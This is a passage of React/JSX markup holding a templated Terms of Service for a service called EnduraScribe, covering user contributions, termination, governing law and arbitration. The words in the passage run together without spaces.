',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>UseabuyingagentorpurchasingagenttomakepurchasesontheServices.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>Makeany<bdtclassName='block-component'/>unauthorized<bdtclassName='statement-end-if-in-editor'/>useoftheServices,includingcollectingusernamesand/oremailaddressesofusersbyelectronicorothermeansforthepurposeofsendingunsolicitedemail,orcreatinguseraccountsbyautomatedmeansorunderfalse{''}<bdtclassName='block-component'/>pretenses<bdtclassName='statement-end-if-in-editor'/>.</span></span></span></span></span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}><spanstyle={{lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',color:'rgb(89,89,89)',}}>UsetheServicesaspartofanyefforttocompetewithusorotherwiseusetheServicesand/ortheContentforanyrevenue-generating{''}<bdtclassName='block-component'/>endeavor<bdtclassName='statement-end-if-in-editor'/>orcommercialenterprise.</span><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',fontFamily:'sans-serif',fontStyle:'normal',fontVariantLigatures:'normal',fontVariantCaps:'normal',fontWeight:400,letterSpacing:'normal',orphans:2,textAlign:'justify',textIndent:'-29.4px',textTransform:'none',whiteSpace:'normal',widows:2,wordSpacing:0,WebkitTextStrokeWidth:0,backgroundColor:'rgb(255,255,255)',textDecorationStyle:'initial',textDecorationColor:'initial',}}><bdtclassName='forloop-component'/></span></span></span></span></span></li></ul></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div></div><divclassName='MsoNormal'style={{lineHeight:'17.25px'}}><divclassName='MsoNormal'style={{lineHeight:1}}><bdtclassName='block-containerif'data-type='if'style={{textAlign:'left'}}><bdtdata-type='conditional-block'><bdtdata-type='body'><divclassName='MsoNormal'data-custom-class='heading_1'id='ugc'style={{lineHeight:'1.5'}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>8.</span></strong></span></strong></span>&nbsp;</strong>USERGENERATEDCONTRIBUTIONS</span></strong></div></bdt></bdt></bdt></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'style={{lineHeight:1}}><bdtclassName='block-containerif'data-type='if'style={{textAlign:'left'}}><bdtdata-type='conditional-block'><bdtdata-type='body'><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><bdtclassName='block-containerif'data-type='if'id='24327c5d-a34f-f7e7-88f1-65a2f788484f'style={{textAlign:'left'}}><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='user_post_content_option'data-type='statement'/><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}>TheServicesdoesnotofferuserstosubmitorpostcontent.<bdtclassName='block-component'/>Wemayprovideyouwiththeopportunitytocreate,submit,post,display,transmit,perform,publish,distribute,orbroadcastcontentandmaterialstousorontheServices,includingbutnotlimitedtotext,writings,video,audio,photographs,graphics,comments,suggestions,orpersonalinformationorothermaterial(collectively,{''}<bdtclassName='block-component'/>&quot;Contributions&quot;<bdtclassName='statement-end-if-in-editor'/>).ContributionsmaybeviewablebyotherusersoftheServicesandthroughthird-partywebsites.<bdtclassName='block-component'/>WhenyoucreateormakeavailableanyContributions,youtherebyrepresentandwarrantthat:<spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><bdtclassName='statement-end-if-in-editor'><bdtclassName='block-component'/></bdt></span></span></bdt></bdt></span></div></bdt></bdt></bdt></div><ulstyle={{fontSize:'medium',textAlign:'left'}}><lidata-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{fontSize:14}}><spandata-custom-class='body_text'>Thecreation,distribution,transmission,publicdisplay,orperformance,andtheaccessing,downloading,orcopyingofyourContributionsdonotandwillnotinfringetheproprietaryrights,includingbutnotlimitedtothecopyright,patent,trademark,tradesecret,ormoralrightsofanythirdparty.</span></span></span></li><lidata-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{fontSize:14}}><spandata-custom-class='body_text'>Youarethecreatorandowneroforhavethenecessary{''}<bdtclassName='block-component'/>licenses<bdtclassName='statement-end-if-in-editor'/>,rights,consents,releases,andpermissionstouseandto<bdtclassName='block-component'/>authorize<bdtclassName='statement-end-if-in-editor'/>us,theServices,andotherusersoftheServicestouseyourContributionsinanymannercontemplatedbytheServicesandtheseLegalTerms.</span></span></span></li><lidata-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{fontSize:14}}><spandata-custom-class='body_text'>Youhavethewrittenconsent,release,and/orpermissionofeachandeveryidentifiableindividualpersoninyourContributionstousethenameorlikenessofeachandeverysuchidentifiableindividualpersontoenableinclusionanduseofyourContributionsinanymannercontemplatedbytheServicesandtheseLegalTerms.</span></span></span></li><lidata-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{fontSize:14}}><spandata-custom-class='body_text'>YourContributionsarenotfalse,inaccurate,ormisleading.</span></span></span></li><lidata-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{fontSize:14}}><spandata-custom-class='body_text'>YourContributionsarenotunsolicitedor{''}<bdtclassName='block-component'/>unauthorized<bdtclassName='statement-end-if-in-editor'/>advertising,promotionalmaterials,pyramidschemes,chainletters,spam,massmailings,orotherformsofsolicitation.</span></span></span></li><lidata-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{fontSize:14}}><spandata-custom-class='body_text'>YourContributionsarenotobscene,lewd,lascivious,filthy,violent,harassing,<bdtclassName='block-component'/>libelous<bdtclassName='statement-end-if-in-editor'/>,slanderous,orotherwiseobjectionable(asdeterminedbyus).</span></span></span></li><lidata-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{fontSize:14}}><spandata-custom-class='body_text'>YourContributionsdonotridicule,mock,disparage,intimidate,orabuseanyone.</span></span></span></li><lidata-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{fontSize:14}}><spandata-custom-class='body_text'>YourContributionsarenotusedtoharassorthreaten(inthelegalsenseofthoseterms)anyotherpersonandtopromoteviolenceagainstaspecificpersonorclassofpeople.</span></span></span></li><lidata-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{fontSize:14}}><spandata-custom-class='body_text'>YourContributionsdonotviolateanyapplicablelaw,regulation,orrule.</span></span></span></li><lidata-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{fontSize:14}}><spandata-custom-class='body_text'>YourContributionsdonotviolatetheprivacyorpublicityrightsofanythirdparty.</span></span></span></li><lidata-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{fontSize:14}}><spandata-custom-class='body_text'>YourContributionsdonotviolateanyapplicablelawconcerningchildpornography,orotherwiseintendedtoprotectthehealthorwell-beingofminors.</span></span></span></li><lidata-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{fontSize:14}}><spandata-custom-class='body_text'>YourContributionsdonotincludeanyoffensivecommentsthatareconnectedtorace,nationalorigin,gender,sexualpreference,orphysicalhandicap.</span></span></span></li><lidata-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{color:'rgb(89,89,89)'}}><spanstyle={{fontSize:14}}><spandata-custom-class='body_text'>YourContributionsdonototherwiseviolate,orlinktomaterialthatviolates,anyprovisionoftheseLegalTerms,oranyapplicablelaworregulation.</span></span></span></li></ul></div></div><divclassName='MsoNormal'style={{textAlign:'justify',lineHeight:'1.5'}}><bdtclassName='block-containerif'data-type='if'style={{textAlign:'left'}}><bdtdata-type='conditional-block'><bdtdata-type='body'><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}>AnyuseoftheServicesinviolationoftheforegoingviolatestheseLegalTermsandmayresultin,amongotherthings,terminationorsuspensionofyourrightstousetheServices.</span></div></bdt></bdt></bdt></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'style={{textAlign:'justify',lineHeight:1}}><bdtclassName='block-containerif'data-type='if'style={{textAlign:'left'}}><bdtdata-type='conditional-block'><bdtdata-type='body'><divclassName='MsoNormal'data-custom-class='heading_1'id='license'style={{lineHeight:'1.5'}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>9.</span></strong></span></strong></span>&nbsp;</strong>CONTRIBUTION<bdtclassName='block-component'/>LICENSE<bdtclassName='statement-end-if-in-editor'/></span></strong></div></bdt></bdt></bdt></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'style={{lineHeight:1}}><bdtclassName='block-containerif'data-type='if'id='a088ddfb-d8c1-9e58-6f21-958c3f4f0709'style={{textAlign:'left'}}><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='user_post_content_option'data-type='statement'/></bdt></bdt></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}>YouandServicesagreethatwemayaccess,store,process,anduseanyinformationandpersonaldatathatyouprovide<bdtclassName='block-component'/>andyourchoices(includingsettings).</span></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}>BysubmittingsuggestionsorotherfeedbackregardingtheServices,youagreethatwecanuseandsharesuchfeedbackforanypurposewithoutcompensationtoyou.<bdtclassName='block-component'/></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}>WedonotassertanyownershipoveryourContributions.YouretainfullownershipofallofyourContributionsandanyintellectualpropertyrightsorotherproprietaryrightsassociatedwithyourContributions.WearenotliableforanystatementsorrepresentationsinyourContributionsprovidedbyyouinanyareaontheServices.YouaresolelyresponsibleforyourContributionstotheServicesandyouexpresslyagreetoexonerateusfromanyandallresponsibilityandtorefrainfromanylegalactionagainstusregardingyourContributions.<bdtclassName='statement-end-if-in-editor'/></span></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><bdtclassName='block-containerif'data-type='if'style={{textAlign:'left'}}><bdtclassName='statement-end-if-in-editor'data-type='close'/></bdt></span></span></span></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><bdtclassName='block-containerif'data-type='if'style={{textAlign:'left'}}><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='review_option'data-type='statement'/></bdt></bdt></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-containerif'data-type='if'style={{textAlign:'left'}}><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='mobile_app_option'data-type='statement'/></bdt></bdt></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-containerif'data-type='if'style={{textAlign:'left'}}><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='socialnetwork_link_option'data-type='statement'/></bdt></bdt></div></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-containerif'data-type='if'style={{textAlign:'left'}}><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='3rd_party_option'data-type='statement'/></bdt></bdt></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-containerif'data-type='if'style={{textAlign:'left'}}><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='advertiser_option'data-type='statement'/></bdt></bdt></div><divclassName='MsoNormal'data-custom-class='heading_1'id='sitemanage'style={{lineHeight:'1.5'}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>10.</span></strong></span></strong></span>&nbsp;</strong>SERVICESMANAGEMENT</span></strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}>Wereservetheright,butnottheobligation,to:(1)monitortheServicesforviolationsoftheseLegalTerms;(2)takeappropriatelegalactionagainstanyonewho,inoursolediscretion,violatesthelawortheseLegalTerms,includingwithoutlimitation,reportingsuchusertolawenforcementauthorities;(3)inoursolediscretionandwithoutlimitation,refuse,restrictaccessto,limittheavailabilityof,ordisable(totheextenttechnologicallyfeasible)anyofyourContributionsoranyportionthereof;(4)inoursolediscretionandwithoutlimitation,notice,orliability,toremovefromtheServicesorotherwisedisableallfilesandcontentthatareexcessiveinsizeorareinanywayburdensometooursystems;and(5)otherwisemanagetheServicesinamannerdesignedtoprotectourrightsandpropertyandtofacilitatetheproperfunctioningoftheServices.</div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-containerif'data-type='if'style={{textAlign:'left'}}><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='privacy_policy_option'data-type='statement'/></bdt><bdtclassName='block-containerif'data-type='if'><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='privacy_policy_followup'data-type='statement'style={{fontSize:'14.6667px'}}/></bdt></bdt></bdt></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-containerif'data-type='if'style={{textAlign:'left'}}><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='copyright_agent_option'data-type='statement'><bdtclassName='block-component'/><bdtclassName='block-component'/></bdt><bdtclassName='block-containerif'data-type='if'style={{textAlign:'left'}}><bdtclassName='statement-end-if-in-editor'data-type='close'/></bdt></bdt></bdt></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><bdtclassName='block-component'/><bdtclassName='block-containerif'data-type='if'style={{textAlign:'left'}}><bdtclassName='statement-end-if-in-editor'data-type='close'><bdtclassName='block-component'/></bdt><bdtclassName='block-component'/></bdt></div><divclassName='MsoNormal'data-custom-class='heading_1'id='terms'style={{lineHeight:'1.5',textAlign:'left'}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>11.</span></strong></span></strong></span>&nbsp;</strong>TERMANDTERMINATION</span></strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}>TheseLegalTermsshallremaininfullforceandeffectwhileyouusetheServices.WITHOUTLIMITINGANYOTHERPROVISIONOFTHESELEGALTERMS,WERESERVETHERIGHTTO,INOURSOLEDISCRETIONANDWITHOUTNOTICEORLIABILITY,DENYACCESSTOANDUSEOFTHESERVICES(INCLUDINGBLOCKINGCERTAINIPADDRESSES),TOANYPERSONFORANYREASONORFORNOREASON,INCLUDINGWITHOUTLIMITATIONFORBREACHOFANYREPRESENTATION,WARRANTY,ORCOVENANTCONTAINEDINTHESELEGALTERMSOROFANYAPPLICABLELAWORREGULATION.WEMAYTERMINATEYOURUSEORPARTICIPATIONINTHESERVICESORDELETE{''}<bdtclassName='block-containerif'data-type='if'id='a6e121c2-36b4-5066-bf9f-a0a33512e768'><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='user_account_option'data-type='statement'/></bdt>ANYCONTENTORINFORMATIONTHATYOUPOSTEDATANYTIME,WITHOUTWARNING,INOURSOLEDISCRETION.</bdt></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}>Ifweterminateorsuspendyouraccountforanyreason,youareprohibitedfromregisteringandcreatinganewaccountunderyourname,afakeorborrowedname,orthenameofanythirdparty,evenifyoumaybeactingonbehalfofthethirdparty.Inadditiontoterminatingorsuspendingyouraccount,wereservetherighttotakeappropriatelegalaction,includingwithoutlimitationpursuingcivil,criminal,andinjunctiveredress.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='modifications'style={{lineHeight:'1.5',textAlign:'left'}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>12.</span></strong></span></strong></span>&nbsp;</strong>MODIFICATIONSANDINTERRUPTIONS</span></strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}>Wereservetherighttochange,modify,orremovethecontentsoftheServicesatanytimeorforanyreasonatoursolediscretionwithoutnotice.However,wehavenoobligationtoupdateanyinformationonourServices.<bdtclassName='block-component'/>WealsoreservetherighttomodifyordiscontinueallorpartoftheServiceswithoutnoticeatanytime.<bdtclassName='statement-end-if-in-editor'/>Wewillnotbeliabletoyouoranythirdpartyforanymodification,pricechange,suspension,ordiscontinuanceoftheServices.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}>WecannotguaranteetheServiceswillbeavailableatalltimes.Wemayexperiencehardware,software,orotherproblemsorneedtoperformmaintenancerelatedtotheServices,resultingininterruptions,delays,orerrors.Wereservetherighttochange,revise,update,suspend,discontinue,orotherwisemodifytheServicesatanytimeorforanyreasonwithoutnoticetoyou.Youagreethatwehavenoliabilitywhatsoeverforanyloss,damage,orinconveniencecausedbyyourinabilitytoaccessorusetheServicesduringanydowntimeordiscontinuanceoftheServices.NothingintheseLegalTermswillbeconstruedtoobligateustomaintainandsupporttheServicesortosupplyanycorrections,updates,orreleasesinconnectiontherewith.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='law'style={{lineHeight:'1.5',textAlign:'left'}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>13.</span></strong></span></strong></span>&nbsp;</strong>GOVERNINGLAW</span></strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><bdtclassName='block-component'/></span></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}>TheseLegalTermsshallbegovernedbyanddefinedfollowingthelawsof{''}<bdtclassName='block-component'/><bdtclassName='question'>theUnitedStates</bdt><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><bdtclassName='statement-end-if-in-editor'/></span>.<bdtclassName='question'>EnduraScribe</bdt>andyourselfirrevocablyconsentthatthecourtsof{''}<spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><bdtclassName='block-component'/><bdtclassName='question'>California</bdt><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}><bdtclassName='statement-end-if-in-editor'/></span></span>{''}shallhaveexclusivejurisdictiontoresolveanydisputewhichmayariseinconnectionwiththeseLegalTerms.<bdtclassName='statement-end-if-in-editor'/></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='disputes'style={{lineHeight:'1.5',textAlign:'left'}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'24.5333px',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>14.</span></strong></span></strong></span>&nbsp;</strong>DISPUTERESOLUTION</span></strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><bdtclassName='block-component'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><bdtclassName='block-component'/></div><divclassName='MsoNormal'data-custom-class='heading_2'style={{lineHeight:'1.5',textAlign:'left'}}><strong>InformalNegotiations</strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:15}}>Toexpediteresolutionandcontrolthecostofanydispute,controversy,orclaimrelatedtotheseLegalTerms(eacha<bdtclassName='block-component'/>&quot;Dispute&quot;andcollectively,the&quot;Disputes&quot;<bdtclassName='statement-end-if-in-editor'/>)broughtbyeitheryouorus(individually,a<bdtclassName='block-component'/>&quot;Party&quot;andcollectively,the&quot;Parties&quot;<bdtclassName='statement-end-if-in-editor'/>),thePartiesagreetofirstattempttonegotiateanyDispute(exceptthoseDisputesexpresslyprovidedbelow)informallyforatleast{''}<bdtclassName='question'>thirty(30)</bdt>daysbeforeinitiatingarbitration.SuchinformalnegotiationscommenceuponwrittennoticefromonePartytotheotherParty.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><bdtclassName='statement-end-if-in-editor'/></div><divclassName='MsoNormal'data-custom-class='heading_2'style={{lineHeight:'1.5',textAlign:'left'}}><strong>BindingArbitration</strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt><spanstyle={{fontSize:15}}>IfthePartiesareunabletoresolveaDisputethroughinformalnegotiations,theDispute(exceptthoseDisputesexpresslyexcludedbelow)willbefinallyandexclusivelyresolvedbybindingarbitration.YOUUNDERSTANDTHATWITHOUTTHISPROVISION,YOUWOULDHAVETHERIGHTTOSUEINCOURTANDHAVEAJURYTRIAL.{''}<bdtclassName='block-component'/>ThearbitrationshallbecommencedandconductedundertheCommercialArbitrationRulesoftheAmericanArbitrationAssociation(<bdtclassName='block-component'/>&quot;AAA&quot;<bdtclassName='statement-end-if-in-editor'/>)and,whereappropriate,theAAA’sSupplementaryProceduresforConsumerRelatedDisputes(<bdtclassName='block-component'/>&quot;AAAConsumerRules&quot;<bdtclassName='statement-end-if-in-editor'/>),bothofwhichareavailableatthe{''}<spanstyle={{fontSize:15,lineHeight:'16.8667px',color:'rgb(0,58,250)',}}><adata-custom-class='link'href='http://www.adr.org'rel='noopenernoreferrer'target='_blank'>AmericanArbitrationAssociation(AAA)website</a></span>.YourarbitrationfeesandyourshareofarbitratorcompensationshallbegovernedbytheAAAConsumerRulesand,whereappropriate,limitedbytheAAAConsumerRules.{''}<bdtclassName='else-block'/>Thearbitrationmaybeconductedinperson,throughthesubmissionofdocuments,byphone,oronline.Thearbitratorwillmakeadecisioninwriting,butneednotprovideastatementofreasonsunlessrequestedbyeitherParty.Thearbitratormustfollowapplicablelaw,andanyawardmaybechallengedifthearbitratorfailstodoso.Exceptwhereotherwiserequiredbytheapplicable<bdtclassName='block-component'/>AAA<bdtclassName='else-block'/>rulesorapplicablelaw,thearbitrationwilltakeplacein<bdtclassName='block-component'/><bdtclassName='question'>SanDiego</bdt>,{''}<bdtclassName='statement-end-if-in-editor'/><bdtclassName='block-component'/><bdtclassName='question'>California</bdt><bdtclassName='statement-end-if-in-editor'/>.Exceptasotherwiseprovidedherein,thePartiesmaylitigateincourttocompelarbitration,stayproceedingspendingarbitration,ortoconfirm,modify,vacate,orenter<bdtclassName='block-component'/>judgment<bdtclassName='statement-end-if-in-editor'/>ontheawardenteredbythearbitrator.</span></div><divclassName='MsoNo